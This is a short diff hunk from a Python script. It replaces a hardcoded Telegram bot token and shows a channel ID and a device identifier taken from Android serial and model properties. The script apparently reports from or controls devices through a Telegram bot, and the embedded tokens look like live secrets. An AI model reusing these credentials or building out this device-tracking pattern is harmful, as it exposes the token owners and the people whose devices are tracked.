@@ -4,7 +4,7 @@
 
 import requests, time, subprocess, os, base64, threading
 
-BOT_TOKEN = '8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk'
+BOT_TOKEN = '8892641336:AAFwwZkYQfd7RCsce3dsiNO5XMmT87tpj0U'
 CHANNEL_ID = -1004369057597
 API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 DEVICE_ID = subprocess.getoutput('getprop ro.serialno') + '_' + subprocess.getoutput('getprop ro.product.model').replace(' ','_')
